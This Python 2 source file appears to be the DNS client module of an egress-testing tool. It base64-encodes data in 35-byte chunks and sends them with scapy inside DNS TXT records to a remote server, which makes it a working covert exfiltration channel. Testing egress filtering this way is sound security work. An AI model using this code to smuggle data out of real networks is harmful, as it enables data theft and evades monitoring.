'''

This is a DNS client that transmits data within DNS TXT requests
Thanks to Raffi for his awesome blog posts on how this can be done
http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/

'''

import base64
from scapy.all import *


class Client:

    def __init__(self, cli_object):
        self.protocol = "dns"
        self.length = 62
        self.remote_server = cli_object.ip

    def transmit(self, data_to_transmit):

        byte_reader = 0
        packet_number = 1

        while (byte_reader < len(data_to_transmit) + 35):
            encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + 35])

            # calcalate total packets
            if ((len(data_to_transmit) % 35) == 0):
                total_packets = len(data_to_transmit) / 35
            else:
                total_packets = (len(data_to_transmit) / 35) + 1

            print "[*] Packer Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
            # Craft the packet with scapy
            send(IP(dst=self.remote_server)/UDP()/DNS(
                id=15, opcode=0,
                qd=[DNSQR(qname="egress-assess.com", qtype="TXT")], aa=1, qr=0,
                an=[DNSRR(rrname=encoded_data, type="TXT", ttl=10)]),
                verbose=False)

            # Increment counters
            byte_reader += 35
            packet_number += 1

        return
